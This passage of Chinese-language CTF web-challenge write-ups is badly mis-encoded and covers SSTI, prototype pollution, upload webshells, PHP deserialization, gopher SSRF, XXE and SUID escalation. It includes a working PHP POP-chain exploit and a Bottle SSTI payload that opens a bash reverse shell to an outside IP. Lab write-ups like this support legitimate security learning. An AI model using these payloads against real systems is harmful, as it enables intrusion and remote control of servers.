è°ƒç”¨æ¨¡æ¿å†…ç½®çš„lipsumå¯¹è±¡ï¼ˆç”¨äºç”Ÿæˆ éšæœºæ–‡æœ¬ï¼‰è®¿é—®å…¨å±€osæ¨¡å—ï¼Œç„¶ååŠ¨æ€è°ƒç”¨ popen æ‰§è¡ŒLinuxç³»ç»Ÿå‘½ä»¤ls /è¿è¡Œå¹¶è¾“å‡ºç»“æœ

catä¹Ÿè¢«è¿‡æ»¤![image-20250526162620392](201-240.assets/image-20250526162620392.png)

![image-20250526162845829](201-240.assets/image-20250526162845829.png)![image-20250526162655236](201-240.assets/image-20250526162655236.png)



## 223.nest_js [Litctf2025]

![image-20250526155606666](201-240.assets/image-20250526155606666.png)

éšä¾¿è¾“å…¥å‡ ä¸ªæ²¡ååº”ï¼ŒçŒœæµ‹æ˜¯ç®€å•çš„å¼±å¯†ç 

![image-20250526160038771](201-240.assets/image-20250526160038771.png)

çŒœåˆ°ç›´æ¥ç»“æŸ

![image-20250526160100576](201-240.assets/image-20250526160100576.png)

## 224.å¤šé‡å®‡å®™æ—¥è®° [Litctf2025]

![image-20250526163208198](201-240.assets/image-20250526163208198.png)

å…ˆæ³¨å†Œè¿›å…¥åˆ°ä¸ªäººèµ„æ–™![image-20250528171912770](201-240.assets/image-20250528171912770.png)

éšæ„æ›´æ–°ä¸€ä¸‹ä¸ªäººèµ„æ–™![image-20250528171948813](201-240.assets/image-20250528171948813.png)



![image-20250526165622299](201-240.assets/image-20250526165622299.png)

æç¤ºåŸå‹é“¾æ±¡æŸ“ï¼ˆ**Prototype Pollution**ï¼‰ï¼Œå®ƒæ˜¯ä¸€ç§ **JavaScript å¯¹è±¡å±æ€§èµ‹å€¼æ¼æ´**ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ `__proto__` æˆ– `constructor.prototype` ç­‰åŸå‹é“¾å±æ€§æ¥ç¯¡æ”¹æ•´ä¸ªåº”ç”¨ä¸­çš„é»˜è®¤å¯¹è±¡ç»“æ„ã€‚

æŸ¥çœ‹æºç ï¼Œé€šè¿‡è¡¨å•æäº¤åªèƒ½ä¿®æ”¹themeå’Œlanguageçš„ï¼Œä½†é€šè¿‡ é«˜çº§/æµ‹è¯•åŒºåŸŸ å¤„èƒ½å¤Ÿç›´æ¥ä¼ å…¥ä¸€æ•´ä¸ªjsonå¯¹è±¡ï¼Œå¹¶ä¸”è¢«JSON.parse()è§£æï¼Œæ²¡æœ‰è¿‡æ»¤ã€‚å¹¶ä¸”äº†è§£åˆ°åŒ…è£…åœ¨settingså¯¹è±¡ä¸‹çš„å†…å®¹æ§åˆ¶ç€ç”¨æˆ·çš„é…ç½®æƒ…å†µ

![image-20250526170015152](201-240.assets/image-20250526170015152.png)



```python
ä½¿ç”¨"__proto__"è·settingså¯¹è±¡çš„åŸå‹ï¼Œå¹¶è®¾ç½®isAdminä¸ºture
```

![image-20250528172342648](201-240.assets/image-20250528172342648.png)

æŸ¥çœ‹é¢æ¿![image-20250526165405027](201-240.assets/image-20250526165405027.png)

## 225.easy_file [Litctf2025]

![image-20250526174813936](201-240.assets/image-20250526174813936.png)

éšæ„è¾“å…¥

![image-20250526180543245](201-240.assets/image-20250526180543245.png)

base64ç¼–ç äº†ï¼Œçœ‹æºç ï¼ˆæ‰«ç›˜å‘ç°admin.php ä½†ä¼šè·³åˆ°index.phpï¼‰

![image-20250527153508044](201-240.assets/image-20250527153508044.png)

é‚£å°±ç›´æ¥è¾“å…¥username=YWRtaW4=&password=cGFzc3dvcmQ=![image-20250527152114242](201-240.assets/image-20250527152114242.png)

åˆ°ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ å›¾åƒåº”è¯¥æ˜¯å›¾ç‰‡

![image-20250527152100048](201-240.assets/image-20250527152100048.png)

ä¸Šä¼ phpï¼Œpngéƒ½è¢«å±è”½ï¼š![image-20250527152216801](201-240.assets/image-20250527152216801.png)

ä½†å‘ç°jpgå¯ä»¥ï¼Œåˆ¶ä½œå›¾ç‰‡é©¬æŠ“åŒ…æ”¹åç¼€ä¸Šä¼ ![image-20250527152803017](201-240.assets/image-20250527152803017.png)

![image-20250527152809129](201-240.assets/image-20250527152809129.png)

æµ‹è¯•é“¾æ¥æŠ¥é”™äº†ï¼Œæ‰¾å…¶ä»–åŠæ³•![image-20250527153442644](201-240.assets/image-20250527153442644.png)

æƒ³åˆ°æºç æœ‰æç¤º    //fileæŸ¥çœ‹å¤´åƒï¼Œä¸åƒæ˜¯å‚æ•°åï¼Œå‘ç°æ˜¯å‚æ•°å![image-20250527153820998](201-240.assets/image-20250527153820998.png)

ä¸€ç›´è¿˜GIF89aï¼Œäºæ˜¯æ¢æ–‡ä»¶ï¼Œç”¨phpæ®µæ ‡ç­¾

![image-20250527154538787](201-240.assets/image-20250527154538787.png)![image-20250527155240794](201-240.assets/image-20250527155240794.png)

![image-20250527155334436](201-240.assets/image-20250527155334436.png)

![image-20250527155354675](201-240.assets/image-20250527155354675.png)

## 226.easy_signin [Litctf2025]

![image-20250527161905720](201-240.assets/image-20250527161905720.png)ä¸€è¿›å»å°±403

æˆ‘ä»¥ä¸ºæ˜¯ç¯å¢ƒé—®é¢˜ï¼Œæ²¡æ€è·¯å…ˆæ‰«ç›˜![image-20250527162408895](201-240.assets/image-20250527162408895.png)

![image-20250527162732754](201-240.assets/image-20250527162732754.png)æç¤ºå‚æ•°ä¸å®Œæ•´ï¼Œæœ€ååªæœ‰login.htmlèƒ½è¿›å…¥ï¼ŒæŸ¥çœ‹æºç 

![image-20250527162756798](201-240.assets/image-20250527162756798.png)

ä¸¤å¤„å…³é”®![image-20250527163214821](201-240.assets/image-20250527163214821.png)

![image-20250527163245320](201-240.assets/image-20250527163245320.png)

æŸ¥çœ‹api/js![image-20250527163340157](201-240.assets/image-20250527163340157.png)

å…ˆå°è¯•çœ‹çœ‹æ–‡ä»¶

![image-20250527163455688](201-240.assets/image-20250527163455688.png)![image-20250527164354500](201-240.assets/image-20250527164354500.png)

å°è¯•phpä¼ªåè®®ï¼Œè¢«ç¦ç”¨ï¼Œå°è¯•fiileåè®®![image-20250527164212523](201-240.assets/image-20250527164212523.png)

å‘ç°fileåè®®å¯ä»¥![image-20250527164741517](201-240.assets/image-20250527164741517.png)

æŸ¥çœ‹å„ä¸ªæ–‡ä»¶ï¼Œæœ€åçœ‹åˆ°![image-20250527165244095](201-240.assets/image-20250527165244095.png)

ç»“æœç›´æ¥å°±èƒ½çœ‹![image-20250527165516239](201-240.assets/image-20250527165516239.png)



## 227.å›ã®åã¯ [LitCtf2025]

![image-20250527233052193](201-240.assets/image-20250527233052193.png)

## 228.[GHCTF 2025]UPUPUP

![image-20250529190747189](201-240.assets/image-20250529190747189.png)

phpæ–‡ä»¶ä¸å…è®¸![image-20250529190814372](201-240.assets/image-20250529190814372.png)

![image-20250529193417942](201-240.assets/image-20250529193417942.png)

æŠ“åŒ…çˆ†ç ´ï¼Œç¡®å®šæœ¬é¢˜ä¸ºç™½åå•é™å®šåç¼€ï¼Œä¸»æµå¯ç”¨æ–‡ä»¶å°¾ç¼€ä¸ºpngï¼Œjpg

ç›´æ¥ä¸Šä¼ .htaccesså¤±è´¥ï¼Œè¦ç”¨æ–‡ä»¶å¤´ç»•è¿‡ï¼ŒGID89aä¼šæ˜¯ç½‘ç«™ç›´æ¥æŠ¥é”™ï¼Œç¿»é˜…èµ„æ–™ä½¿ç”¨\#define width 1337
\#define height 1337



![image-20250529193453708](201-240.assets/image-20250529193453708.png)

æœ€åä¸Šä¼ å›¾ç‰‡é©¬ï¼Œè¿æ¥yijian



## 229.æƒ³çŠ¯å¤§å´ç–†åœŸå— [ISCC]

![image-20250605181909130](201-240.assets/image-20250605181909130.png)

ç„¶åä¼šå‘ç°urlåé¢è¿˜æœ‰ä¸ªbox4ï¼ŒæŠŠ**é“ç´¢è¿ç¯**æäº¤åˆ°box4ï¼Œç„¶åæ‹¿åˆ°reward.phpæ–‡ä»¶

```php
<?php
if (!isset($_GET['xusheng'])) {
    ?>
    <html>
    <head><title>Reward</title></head>
    <body style="font-family:sans-serif;text-align:center;margin-top:15%;">
        <h2>æƒ³ç›´æ¥æ‹¿å¥–åŠ±ï¼Ÿ</h2>
        <h1>å°”è¦è¯•è¯•æˆ‘å®åˆ€æ˜¯å¦é”‹åˆ©å—ï¼Ÿ</h1>
    </body>
    </html>
    <?php
    exit;
}

error_reporting(0);
ini_set('display_errors', 0);
?>

<?php

// çŠ¯flag.phpç–†åœŸè€…ï¼Œç››å¿…å‡»è€Œç ´ä¹‹ï¼

class GuDingDao {
    public $desheng;

    public function __construct() {
        $this->desheng = array();
    }
    
    public function __get($yishi) {
        $dingjv = $this->desheng;
        $dingjv();
        return "ä¸‹æ¬¡æ²™åœºç›¸è§, å¾æŸå®šä¸ç•™æƒ…";
    }

}

class TieSuoLianHuan {
    protected $yicheng;

    public function append($pojun) {
        include($pojun);
    }
    
    public function __invoke() {
        $this->append($this->yicheng);
    }

}

class Jie_Xusheng {
    public $sha;
    public $jiu;

    public function __construct($secret = 'reward.php') {
        $this->sha = $secret;
    }
    
    public function __toString() {
        return $this->jiu->sha;
    }
    
    public function __wakeup() {
        if (preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->sha)) {
            echo "ä½ ä¼‘æƒ³å·çœ‹å´å›½æœºå¯†";
            $this->sha = "reward.php";
        }
    }

}

echo 'ä½ ä»€ä¹ˆéƒ½æ²¡çœ‹åˆ°ï¼Ÿé‚£è¯´æ˜â€¦â€¦æœ‰ä¸œè¥¿ä½ æ²¡çœ‹åˆ°<br>';

if (isset($_GET['xusheng'])) {
    @unserialize($_GET['xusheng']);
} else {
    $a = new Jie_Xusheng;
    highlight_file(__FILE__);
}

// é“¸ä¸‹è¿™é“é“¾ï¼Œæ±Ÿä¸œå¤©é™©ç‰¢ä¸å¯ç ´ï¼

```

phpååºåˆ—åŒ–ï¼Œ

å¤ç°ï¼šTieSuoLianHuanç±»ä¸­æœ‰ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæœ€åè¦æ‹¿åˆ°flagï¼Œè‚¯å®šè¦æ–‡ä»¶åŒ…å«çš„

è¯´çœŸçš„æœ‰ä¸ªéå¸¸å¤§çš„è„‘æ´ï¼Œè¦æŠŠGuDingDaoç»“å°¾çš„oæ”¹ä¸º0æ‰èƒ½æ‰§è¡ŒæˆåŠŸï¼Œé€†å¦‚å¤©ï¼

æ„é€ çš„ååºåˆ—åŒ–è¿å­ï¼š	

```php
<?php

class GuDingDa0 {
    public $desheng;

    public function __get($yishi) {
        $dingjv = $this->desheng;
        $dingjv();
        return "ä¸‹æ¬¡æ²™åœºç›¸è§, å¾æŸå®šä¸ç•™æƒ…";
    }

}

class TieSuoLianHuan {
    protected $yicheng="php://filter/convert.base64-encode/resource=flag.php";

    public function append($pojun) {
        include($pojun);
    }
    
    public function __invoke() {
        $this->append($this->yicheng);
    }

}

class Jie_Xusheng {
    public $sha;
    public $jiu;

    public function __toString() {
        return $this->jiu->sha;
    }
    
    public function __wakeup() {
        if (preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->sha)) {
            echo "ä½ ä¼‘æƒ³å·çœ‹å´å›½æœºå¯†";
        }
    }

}

$a = new Jie_Xusheng();
$a->sha=new Jie_Xusheng();
$a->sha->jiu = new GuDingDa0();
$a->sha->jiu->desheng=new TieSuoLianHuan();

echo serialize($a);
echo "\n\n\n";
echo (str_replace('_', '%5F', urlencode(serialize($a))));
echo "\n";

```

æ„é€ payloadå¾—åˆ°flagçš„base64ç 



## 230. [GHCTF 2025]Message in a Bottle

![image-20250702152307247](201-240.assets/image-20250702152307247.png)ã€

![image-20250702152414434](201-240.assets/image-20250702152414434.png)

çœ‹é™„ä»¶æºä»£ç  è®¾ç½®äº†wafå±è”½{}ç¬¦å·![image-20250702152902312](201-240.assets/image-20250702152902312.png)ï¼Œé‚£è¯´æ˜å¯ä»¥ç»•è¿‡å†sstiæ¨¡æ¿æ³¨å…¥

æŠŠé™„ä»¶ä»£ç æŠ›ç»™ai è¿™é¢˜ç”¨äº†bottleæ¡†æ¶ï¼ŒæŸ¥è¯¢bottleçš„ssti

æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£  [æ¨¡æ¿å¼•æ“](https://so.csdn.net/so/search?q=æ¨¡æ¿å¼•æ“&spm=1001.2101.3001.7020)å…è®¸æ‚¨åœ¨æ¨¡æ¿ä¸­åµŒå…¥pythonä»£ç çš„è¡Œæˆ–å—ã€‚ä»£ç è¡Œä»¥å¼€å¤´ `%` [ä»£ç å—](https://so.csdn.net/so/search?q=ä»£ç å—&spm=1001.2101.3001.7020)è¢« `<%` å’Œ `%>` ä»¤ç‰Œï¼š

![image-20250706205441305](201-240.assets/image-20250706205441305.png)

ç”±äºifåˆ¤æ–­æœ‰ä¸€ä¸ªç‰¹æ€§ï¼š

**`if`è¯­å¥åœ¨æ¨¡æ¿æ¸²æŸ“æ—¶å¿…å®šä¼šæ‰§è¡Œæ¡ä»¶è¡¨è¾¾å¼ï¼ˆæ— è®ºæ¡ä»¶çœŸå‡ï¼‰**

ä¹Ÿå°±æ˜¯è¯´åªè¦æŠŠä»£ç å†™åœ¨ifåé¢å°±ä¸€å®šèƒ½æ‰§è¡Œå†™å…¥çš„ä»£ç 

æˆ‘ä»¬å¯¼å…¥osæ¨¡å—

![image-20250707140720684](201-240.assets/image-20250707140720684.png)

![image-20250707140609546](201-240.assets/image-20250707140609546.png)

å¦ä¸€ç§è§£æ³•
åœ¨SimpleTemplateæ¨¡æ¿ä¸‹æˆ‘ä»¬å¯ä»¥ä½¿â½¤ % æ¥æ‰§â¾pythonä»£ç ã€‚

è¿™æ ·å°±å¯ä»¥ç»•è¿‡ { äº†ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ % æ‰€åœ¨çš„é‚£â¼€â¾ % çš„å‰é¢åªèƒ½æœ‰ç©ºç™½å­—ç¬¦ï¼Œæˆ‘ä»¬ç›´æ¥æ¢è¡Œå³å¯

```

% __import__('os').popen("bash -c 'bash -i >& /dev/tcp/123.56.103.169/4444  0>&1'").read()
```




## 231.[GHCTF 2025]ez_readfile

![image-20250702155515400](201-240.assets/image-20250702155515400.png)

å¼ºæ¯”è¾ƒçš„è¯åªèƒ½ç”¨hashç¢°æ’ç»•è¿‡![image-20250702163723798](201-240.assets/image-20250702163723798.png)

åé¢å°±æ˜¯æ‰¾flagåœ¨ä»€ä¹ˆæ–‡ä»¶ä¸‹ çˆ†ç ´ ![image-20250702165618948](201-240.assets/image-20250702165618948.png)

 å®åœ¨æ‰¾ä¸åˆ° çœ‹wp

æ— æ³•ç›´æ¥è·å–åˆ°flagå†…å®¹ï¼Œåªèƒ½å°è¯•ä»å…¶å®ƒçš„***\*æ•æ„Ÿä¿¡æ¯æ–‡ä»¶\****ä¸­è·å–å¯èƒ½æœ‰ç”¨çš„æ¶ˆæ¯ï¼Œè¿™é‡Œæ¨èç›´æ¥ä½¿ç”¨***\*å­—å…¸çˆ†ç ´\****ï¼š

å­—å…¸ï¼š[Ubuntu Pastebin](https://paste.ubuntu.com/p/JjJ3krY2Dq/)

`ä»€ä¹ˆæ˜¯ docker-entrypoint.sh` ï¼š Docker å®¹å™¨ä¸­å¸¸è§çš„å…¥å£è„šæœ¬ï¼Œé€šå¸¸ç”¨äºåœ¨å®¹å™¨å¯åŠ¨æ—¶æ‰§è¡Œä¸€äº›åˆå§‹åŒ–ä»»åŠ¡ï¼Œæ¯”å¦‚é…ç½®ç¯å¢ƒå˜é‡ï¼ˆæ£€æŸ¥æˆ–è®¾ç½®å¿…è¦çš„ç¯å¢ƒå˜é‡ï¼ˆå¦‚æ•°æ®åº“è¿æ¥é…ç½®ï¼‰ï¼‰ã€è®¾ç½®æƒé™ã€å¯åŠ¨æœåŠ¡ç­‰ç­‰

ç›®æ ‡å¯ç”¨äº†å®¹å™¨ï¼Œç»å¸¸æ‰“RCEæ¼æ´ç»ƒä¹ çš„æœ‹å‹ä»¬éƒ½çŸ¥é“ï¼Œå¯ä»¥ä»vulhubæˆ–è€…dockerä¸Šä¸‹è½½é•œåƒæ–‡ä»¶,å…¶ä¸­é…ç½®æ–‡ä»¶å¾€å¾€ä½¿ç”¨docker-compose.ymlï¼Œä½†æ˜¯å¾€å¾€è¿˜ä¼šå­˜åœ¨ç€docker-entrypoint.sh æˆ–è€… entrypoint.shä½œä¸ºå®¹å™¨çš„å¯åŠ¨è„šæœ¬ã€‚

ä¸€èˆ¬docker-compose.ymlä¸­çš„æ–‡ä»¶åŒ…å«äº†webçš„ç«¯å£ã€æ•°æ®åº“é•œåƒçš„ä¸‹è½½å’Œå­˜æ”¾è·¯å¾„ï¼Œè€Œdocker-entrypoint.sh  ä¸­æ›´å¤šçš„æ˜¯å¯¹ä¸€äº›æ•°æ®åº“çš„å…·ä½“æ“ä½œï¼Œæ¯”å¦‚è®¾ç½®æœ¬ç¯å¢ƒä¸­çš„ç®¡ç†å‘˜ç”¨æˆ·å¯†ç ç­‰ç­‰ã€‚

è¿™æ„å‘³ç€ï¼Œå¦‚æœæœ¬é¢˜ç›®çš„dockerç¯å¢ƒä¸­å°è¯•åˆ›å»ºäº†flagæ–‡ä»¶çš„è¯ï¼Œé‚£ä¹ˆå®ƒå¤§æ¦‚ç‡ä¼šé€šè¿‡docker-entrypoint.shå’Œdocker-compose.ymlä¸¤ä¸ªæ–‡ä»¶è¿›è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å»å°è¯•è®¿é—®è¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚ä½†æ˜¯å¯¹äºè¿™ä¸¤ä¸ªæ–‡ä»¶çš„å­˜æ”¾è·¯å¾„è¿˜æœ‰å¾…è€ƒç©¶ï¼Œå®ƒå¯èƒ½å­˜æ”¾åœ¨æ ¹ç›®å½•ä¸‹ï¼Œå¯èƒ½å­˜æ”¾åœ¨webçš„ä¸Šçº§ç›®å½•ï¼Œä¹Ÿå¯èƒ½å’Œä¸‹è¿°çš„æœç´¢ç»“æœä¸€æ ·ï¼Œå­˜æ”¾åœ¨/var/lib/docker/overlay2/å®¹å™¨id/diff(/usr/local/bin/)ä¸‹ã€‚


![image-20250702173254699](201-240.assets/image-20250702173254699.png)

![image-20250702172755982](201-240.assets/image-20250702172755982.png)

ä½†è¿™ä¸æ˜¯é¢„æœŸè§£

æ­£ç¡®æ€è·¯ï¼šâ‘ é€šè¿‡è‡ªåŠ¨åŒ–å·¥å…·è·å–äº†ç›®æ ‡çš„æŒ‡çº¹ä¿¡æ¯ â‘¡æ˜ç¡®æˆ‘ä»¬çš„éœ€æ±‚ï¼Œæœç´¢è¯¥æŒ‡çº¹æ¡ä»¶ä¸‹æ˜¯å¦å­˜åœ¨èƒ½å°†XXEæå‡ä¸ºRCEçš„æ¼æ´ã€‚

| å·¥å…·                      | ç”¨é€”                           |
| ------------------------- | ------------------------------ |
| WhatWeb/Wappalyzer        | Web æŠ€æœ¯è¯†åˆ«                   |
| nmap + -sV                | æ¢æµ‹æœåŠ¡ç‰ˆæœ¬                   |
| dirsearch/gobuster        | æ¢æµ‹ç›®å½•                       |
| SearchSploit / Exploit-DB | æœç´¢æŒ‡çº¹å¯¹åº”çš„æ¼æ´             |
| Google + CVEå·            | æŸ¥æ˜¯å¦å­˜åœ¨ XXE å¯RCEçš„ç»„åˆæ¼æ´ |



## 232.[GHCTF 2025]SQL???

![image-20250703120003103](201-240.assets/image-20250703120003103.png)

![image-20250703120129575](201-240.assets/image-20250703120129575.png)

å‘ç°æ˜¯sqlite

![image-20250703120834056](201-240.assets/image-20250703120834056.png)

![image-20250703121027880](201-240.assets/image-20250703121027880.png)

1. **`group_concat(sql)`**
   - `sqlite_master` æ˜¯SQLiteçš„ç³»ç»Ÿè¡¨ï¼Œå­˜å‚¨æ‰€æœ‰è¡¨çš„ç»“æ„å®šä¹‰ã€‚
   - `sql` åˆ—è®°å½•äº†æ¯ä¸ªè¡¨çš„åˆ›å»ºè¯­å¥ï¼ˆå¦‚ `CREATE TABLE users(id INT, name TEXT)`ï¼‰ã€‚
   - `group_concat()` å°†æ‰€æœ‰è¡¨çš„å®šä¹‰åˆå¹¶æˆä¸€ä¸ªå­—ç¬¦ä¸²è¿”å›ï¼ˆé¿å…å¤šè¡Œç»“æœæ— æ³•æ˜¾ç¤ºï¼‰ã€‚
   - tbl_name
2. **`FROM sqlite_master`**
   - ä»SQLiteçš„ç³»ç»Ÿè¡¨ä¸­æŸ¥è¯¢æ•°æ®ã€‚

![image-20250703121520640](201-240.assets/image-20250703121520640.png)

![image-20250703122655600](201-240.assets/image-20250703122655600.png)

æœ€åæŸ¥çœ‹flagè¡¨å³å¯ group_concat(flag) from flag;(ä¸€èˆ¬å¯åŠ ä¸Šlimit 0,1æ¥é™åˆ¶è¡Œæ•°)

![image-20250703123025258](201-240.assets/image-20250703123025258.png)

## 233.[GHCTF 2025]Goph3rrr

çœ‹é¢˜ç›®å°±æ˜¯éœ€è¦gopherä¼ªåè®®![image-20250703170306514](201-240.assets/image-20250703170306514.png)

æˆ‘ç°è¿›è¡Œæ‰«ç›˜ æ‰«å‡ºæºä»£ç 

ç²¾ç®€åå‰©ä¸‹æœ‰ç”¨çš„![image-20250703173439276](201-240.assets/image-20250703173439276.png)

![image-20250703173507599](201-240.assets/image-20250703173507599.png)

æ ¹æ®Manageå’ŒG0pherè·¯oç”± æ˜æ˜¾çš„å¯ç”¨ssrfè¿›è¡ŒGopheråè®®æ”»å‡»

(1)GETæäº¤ï¼š

éœ€è¦ä¿ç•™çš„å¤´éƒ¨ä¿¡æ¯ï¼š

GET /index.php HTTP/1.1

Host:178.250.250.1

ç„¶åå°†ä»¥ä¸Šä¿¡æ¯åšä¸¤æ¬¡urlç¼–ç å†åŠ å…¥<gopher-path>ä¸­

(2)POSTæäº¤ï¼š

éœ€è¦ä¿ç•™çš„å¤´éƒ¨ä¿¡æ¯ï¼š

POST

Host:

Content-Type:

Content-Length:

ç„¶åå°†ä»¥ä¸Šä¿¡æ¯åšä¸¤æ¬¡urlç¼–ç å†åŠ å…¥<gopher-path>ä¸­


![image-20250703174250926](201-240.assets/image-20250703174250926.png)

![image-20250704091142624](201-240.assets/image-20250704091142624.png)

![image-20250704094343197](201-240.assets/image-20250704094343197.png)

**`0.0.0.0` çš„ç‰¹æ®Šæ€§**ï¼š

- åœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­ï¼Œ`0.0.0.0` è¡¨ç¤ºç»‘å®šåˆ°æ‰€æœ‰ç½‘ç»œæ¥å£ï¼Œä½†å®é™…å‘èµ·è¯·æ±‚æ—¶ï¼Œ`curl` ä¼šå°†å…¶è§†ä¸ºæœ¬åœ°å›ç¯åœ°å€ï¼ˆ`127.0.0.1`ï¼‰ã€‚
- å› æ­¤æ”»å‡»è€…é€šè¿‡ `0.0.0.0` ç»•è¿‡é»‘åå•ï¼Œè€Œå®é™…è¯·æ±‚ä»å‘é€åˆ°æœ¬åœ°æœåŠ¡ã€‚

**åŠŸèƒ½**ï¼šåœ¨Unix/Linuxç³»ç»Ÿä¸­ï¼Œ`env`å‘½ä»¤ç”¨äº**æ‰“å°å½“å‰Shellç¯å¢ƒçš„æ‰€æœ‰å˜é‡**ï¼ŒåŒ…æ‹¬ï¼š

- æ•°æ®åº“å¯†ç ï¼ˆå¦‚`MYSQL_PASSWORD`ï¼‰
- APIå¯†é’¥ï¼ˆå¦‚`AWS_ACCESS_KEY_ID`ï¼‰
- é…ç½®æ–‡ä»¶è·¯å¾„ï¼ˆå¦‚`CONFIG_PATH`ï¼‰
- æœåŠ¡ç«¯å£å’Œå¯†é’¥ï¼ˆå¦‚`SECRET_KEY`ï¼‰

## 234.[GHCTF 2025]**(>ï¹<)**

XXE æœ¬è´¨ä¸Šå°±æ˜¯ï¼š**ä½ æäº¤äº†ä¸€æ®µ XMLï¼ŒæœåŠ¡å™¨â€œä¿¡äº†â€ä½ å®šä¹‰çš„ä¸œè¥¿ï¼Œç„¶åå°±å»å¸®ä½ æ‰“å¼€æ–‡ä»¶æˆ–è®¿é—® URL**ã€‚

![image-20250704164148283](201-240.assets/image-20250704164148283.png)

å…³é”®ç‚¹ï¼š

1. load_dtd=True å’Œ resolve_entities=Trueï¼š

Â·load_dtd=True å…è®¸ XML è§£æå™¨åŠ è½½å¤–éƒ¨ DTDï¼ˆDocument Type Definitionï¼‰ï¼Œå¯ä»¥ç®€å•çš„ç†è§£ä¸ºload_dtdå‚æ•°ä¸ºTRUEæ—¶å¯ä»¥ç¯¡æ”¹xmlæ–‡ä»¶ã€‚

Â·resolve_entities=True å…è®¸è§£æ XML å®ä½“ï¼ˆåœ¨ XML é‡Œï¼Œå®ä½“æ˜¯ä¸€ç§å ä½ç¬¦ï¼Œå¯ä»¥åœ¨ XML æ–‡æ¡£ä¸­è¢«æ›¿æ¢ä¸ºæŸäº›å€¼ï¼‰ï¼Œxmlæ–‡ä»¶è¢«ç¯¡æ”¹åå¿…é¡»è¦è¢«è§£ææ‰èƒ½ç”Ÿæ•ˆ

2. root = etree.fromstring(xml, parser)  root.find('name').text ï¼š

Â·è¯¥å‘½ä»¤å°† XML å­—ç¬¦ä¸²è§£ææˆä¸€ä¸ª XML æ ‘å¯¹è±¡ï¼Œå¹¶èµ‹å€¼ç»™ root å˜é‡ã€‚


æŒ‰è¦æ±‚æ„é€ xxeå¤–éƒ¨ç»“æ„ æ³¨æ„ç‚¹

1. xmlçš„å€¼è¦è¿›è¡Œä¸€æ¬¡urlç¼–ç 

2. æ”¹ä¸ºpostè¯·æ±‚åè¦åŠ ä¸ŠContent-Type: application/x-www-form-urlencoded![image-20250704173316355](201-240.assets/image-20250704173316355.png)

æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯![image-20250704174014108](201-240.assets/image-20250704174014108.png)

![image-20250704174029281](201-240.assets/image-20250704174029281.png)

çŒœæµ‹ä¼šä¸ä¼šæ›´ç›®å½•ä¸‹çš„flagæ–‡ä»¶

![image-20250704172140303](201-240.assets/image-20250704172140303.png)



## 235.[GHCTF 2025]GetShell

ä¸€é•¿ä¸²ä»£ç  ç›´æ¥ä¸¢ç»™aiåˆ†æï¼Œæ‰¾åˆ°æ³¨å…¥ç‚¹![image-20250705150110559](201-240.assets/image-20250705150110559.png)

å…ˆæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶æœ‰ä»€ä¹ˆ index.phpå’Œwc

![image-20250705150920779](201-240.assets/image-20250705150920779.png)

åœ¨æŸ¥çœ‹æ ¹ç›®å½•![image-20250705151005714](201-240.assets/image-20250705151005714.png)

æ ¹æ®é¶åœºåˆ¶ä½œç»éªŒï¼Œdocker-entrypoint.shå¯èƒ½æœ‰flagçš„ä¿¡æ¯ catæ‰“å¼€çœ‹çœ‹ï¼ˆå› ä¸ºbpçš„å“åº”ä¸­çš„ä¸­æ–‡æ˜¯ä¹±ç ï¼Œç”¨æµè§ˆå™¨æ‰“å¼€ï¼‰

![image-20250705151309967](201-240.assets/image-20250705151309967.png)

flagçš„æƒé™å¾ˆä½ 

```
chmod 700 /flag  # åªæœ‰æ‰€æœ‰è€…å¯è¯»å†™æ‰§è¡Œ
```

è¿™è¡¨æ˜ç›´æ¥è¯»å–`/flag`å¯èƒ½ä¼šé‡åˆ°æƒé™é—®é¢˜ï¼Œéœ€è¦è¿›è¡Œææƒ

![image-20250705151658449](201-240.assets/image-20250705151658449.png)

![image-20250705150441144](201-240.assets/image-20250705150441144.png)

å°è¯•å†™å…¥ä¸€å¥è¯æœ¨é©¬ä¹Ÿå‘ç°æƒé™ä¸è¶³![image-20250705163917431](201-240.assets/image-20250705163917431.png)

![image-20250705163938357](201-240.assets/image-20250705163938357.png)



åˆ¤æ–­æ˜¯å¦å­˜åœ¨å¯åˆ©ç”¨çš„ SUID ç¨‹åºï¼š find / -perm -4000 -type f 2>/dev/null

æŸ¥æ‰¾ææƒ![image-20250705164402381](201-240.assets/image-20250705164402381.png)

![image-20250705164320021](201-240.assets/image-20250705164320021.png)

## 236.[GHCTF 2025]upload?SSTI!

![image-20250705222611872](201-240.assets/image-20250705222611872.png)

æ ¹æ®æç¤ºæ¶‰åŠåˆ°æ–‡ä»¶ä¸Šä¼  æ¨¡æ¿æ³¨å…¥ä»¥åŠç›¸å…³è¿‡æ»¤

![image-20250705222818446](201-240.assets/image-20250705222818446.png)

æ–‡ä»¶ä¸Šä¼ 

1. ä¸Šä¼ ä¸€å¥è¯phpï¼š![image-20250705223136403](201-240.assets/image-20250705223136403.png)
2. ä¸Šä¼ GIF89aå¤´çš„å›¾ç‰‡ç ï¼šåŒä¸Š
3. æƒ³å…ˆä¸Šä¼ htaccessä¹Ÿæ˜¯ç±»å‹é”™è¯¯

å¿½ç„¶å‘ç°æœ‰é™„ä»¶ï¼Œæ‰”ç»™aiå®¡è®¡ ï¼š

æä¾›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼ˆé™åˆ¶ä¸ºtxt/log/text/md/jpg/png/gifæ‰©å±•åï¼‰

è¿‡æ»¤äº†*** ['_', 'os', 'subclasses', '__builtins__', '__globals__','flag',]***

```python
tmp_str = """<!DOCTYPE html>...<pre>{data}</pre>...""".format(name=safe_filename, data=file_data)
return render_template_string(tmp_str)
```

 è¿™é‡Œæœ‰sstiæ¼æ´ é‚£æ€è·¯å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªåŒ…å«sstiæ³¨å…¥payloadçš„txtæ–‡ä»¶

æŸ¥çœ‹ç½‘é¡µæŒ‡çº¹![image-20250705225435019](201-240.assets/image-20250705225435019.png)

